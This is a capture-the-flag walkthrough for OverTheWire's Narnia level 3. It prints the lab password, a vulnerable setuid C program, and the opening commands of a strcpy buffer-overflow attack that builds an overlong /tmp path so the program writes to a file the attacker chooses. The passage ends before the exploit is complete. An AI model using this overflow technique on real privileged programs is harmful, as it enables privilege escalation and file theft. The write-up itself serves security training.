This is a solution guide to the Narnia3 Level at [overthewire](http://overthewire.org/wargames/narnia/)

This write-up was created on 6 October 2015.

First connect to the lab
<ul><li> ssh narnia3@narnia.labs.overthewire.org</li>
<li> Enter the following as the password vaequeezee</li></ul>

Change directories to the narnia games folder
```cd /narnia```

First let's examine how we get the password for the next level.

```less narnia3.c```

```c
int main(int argc, char **argv){
 
 int  ifd,  ofd;
 char ofile[16] = "/dev/null";
 char ifile[32];
 char buf[32];
 
 if(argc != 2){
  printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
  exit(-1);
 }
 
/* open files */
 strcpy(ifile, argv[1]);
 if((ofd = open(ofile,O_RDWR)) < 0 ){
  printf("error opening %s\n", ofile);
  exit(-1);
 }
 if((ifd = open(ifile, O_RDONLY)) < 0 ){
  printf("error opening %s\n", ifile);
  exit(-1);
 }
 
/* copy from file1 to file2 */
 read(ifd, buf, sizeof(buf)-1);
 write(ofd,buf, sizeof(buf)-1);
 printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);
 
/* close 'em */
 close(ifd);
 close(ofd);
 
 exit(1);
}
```

This is an interesting problem because the program accepts a command line argument and then does a strcpy() of argv[1], your first argument when running the program. When we check the man pages for strcpy() we find, "The  strcpy()  function copies the string pointed to by src, including the terminating null byte ('\0'), to the buffer  pointed  to  by  dest." We also find at the end of the man page a specific bug (shortcut is shift+gg):

```
BUGS
 If the destination string of a strcpy() is not large enough, then  any-
 thing  might  happen.   Overflowing  fixed-length  string  buffers is a
 favorite cracker technique for taking complete control of the  machine.
 Any  time  a  program  reads  or copies data into a buffer, the program
 first needs to check that there's enough space.  This may  be  unneces-
 sary  if you can show that overflow is impossible, but be careful: pro-
 grams can get changed over time, in ways that may make  the  impossible
 possible.
 ```
 
Great so now we know we have another buffer overflow, and you can find more information about buffer overflows at [exploit-db](https://www.exploit-db.com/papers/13207/). So knowing this information we now know that strcpy() will take everything it finds in argv[1] until it reaches a null character, but the buffer for ifile is only 32 bytes. If our argv[1] were longer than 32 bytes it would overflow into something, but now the question is:

(ul)(li)What is the something that argv[1] overuns?(/li)
(li)Can we take advantage of the buffer overrun and make it do something unintended?(/li>(/ul)

First, lets make some files. Since we know that the buffer needs to be overrun by 32 bytes we need to name a file something that is larger than 32 bytes. After the file is created we can test our theory with:

```bash 
python -c 'print(len("/tmp/" + "a"*27))' #verify our temp folder is long enough
mkdir -p $(python -c 'print ("/tmp/" + "a"*27 + "/")') #create the directory
cd $(python -c 'print ("/tmp/" + "a"*27 + "/")') #change to the directory
/narnia/narnia3 `pwd`/test-theory #test theory
```
